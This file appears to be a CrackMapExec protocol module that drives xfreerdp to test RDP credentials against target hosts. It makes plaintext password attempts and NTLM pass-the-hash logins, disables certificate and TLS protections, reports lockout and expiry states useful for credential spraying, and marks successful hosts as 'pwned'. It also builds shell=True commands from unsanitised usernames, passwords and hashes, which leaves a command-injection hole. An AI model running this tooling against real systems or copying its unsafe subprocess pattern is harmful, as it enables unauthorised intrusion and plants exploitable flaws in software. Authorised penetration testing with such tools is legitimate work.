import asyncio
import subprocess
import os

from termcolor import colored
from datetime import datetime

from cme.connection import *
from cme.logger import CMEAdapter
from cme.config import host_info_colors
from cme.config import process_secret

success_login_yes_rdp = "Authentication only, exit status 0"

status_dict = {
    'Account has been locked':['ERRCONNECT_ACCOUNT_LOCKED_OUT'],
    'Account has been disabled':['ERRCONNECT_ACCOUNT_DISABLED [0x00020012]'],
    'Account was expired':['0x0002000D','0x00000009'],
    'Not support NLA':['ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED [0x0002000C]'],
    'Password expired':['0x0002000E','0x0002000F','0x00020013'],
    'RDP login failed':['0x00020009','0x00020014'],
    'Failed':['Resource temporarily unavailable', 'Broken pipe', 'ERRCONNECT_CONNECT_FAILED [0x00020006]']
}

class xfreerdp(connection):

    def __init__(self, args, db, host):
        self.output_filename = None
        self.domain = None
        self.server_os = None
        self.url = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = CMEAdapter(
            extra={
                "protocol": "XFREERDP",
                "host": self.host,
                "port": self.args.port,
                "hostname": self.host,
            }
        )
    
    def print_host_info(self):
        self.logger.display(f"(name:{self.host})")
        return True

    def create_conn_obj(self):
        try:
            connection = subprocess.Popen(f'xfreerdp /v:"{self.host}" /port:{self.args.port} +auth-only /d:"aa" /u:"aa" /p:"aa" /cert-ignore /tls-seclevel:0 /timeout:{self.args.rdp_timeout * 1000}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output_error = connection.stderr.read()
            output_info = connection.stdout.read()
            if any(single_word in output_error.decode('utf-8') for single_word in status_dict['Failed']):
                return False
            else:
                self.logger.extra["hostname"] = self.host
                self.output_filename = os.path.expanduser(f"~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))
                return True
        except Exception as e:
            self.logger.error(str(e))
        return False
    
    def plaintext_login(self, domain, username, password):
        try:
            connection = subprocess.Popen(f'xfreerdp /v:"{self.host}" /port:{self.args.port} +auth-only /d:"{domain}" /u:"{username}" /p:"{password}" /cert-ignore /tls-seclevel:0 /timeout:{self.args.rdp_timeout * 1000}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output_error = connection.stderr.read()
            output_info = connection.stdout.read()
            if success_login_yes_rdp in output_error.decode('utf-8'):
                self.admin_privs = True
                self.logger.success(f"{domain}\\{username}:{process_secret(password)} {self.mark_pwned()}")
            else:
                for k,v in status_dict.items():
                    if any(single_word in output_error.decode('utf-8') for single_word in v):
                        self.logger.fail(f"{domain}\\{username}:{process_secret(password)} {k}")
                        return False

            if not self.args.continue_on_success:
                return True
        
        except Exception as e:
            self.logger.error(str(e))

    def hash_login(self, domain, username, ntlm_hash):
        try:
            connection = subprocess.Popen(f'xfreerdp /v:"{self.host}" /port:{self.args.port} +auth-only /d:"{domain}" /u:"{username}" /p:"" /pth:{ntlm_hash} /sec:nla /cert-ignore /tls-seclevel:0 /timeout:{self.args.rdp_timeout * 1000}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output_error = connection.stderr.read()
            output_info = connection.stdout.read()
            if success_login_yes_rdp in output_error.decode('utf-8'):
                self.admin_privs = True
                self.logger.success(f"{domain}\\{username}:{process_secret(ntlm_hash)} {self.mark_pwned()}")
            else:
                for k,v in status_dict.items():
                    if any(single_word in output_error.decode('utf-8') for single_word in v):
                        self.logger.fail(f"{domain}\\{username}:{process_secret(ntlm_hash)} {k}")
                        return False

            if not self.args.continue_on_success:
                return True
        
        except Exception as e:
            self.logger.error(str(e))
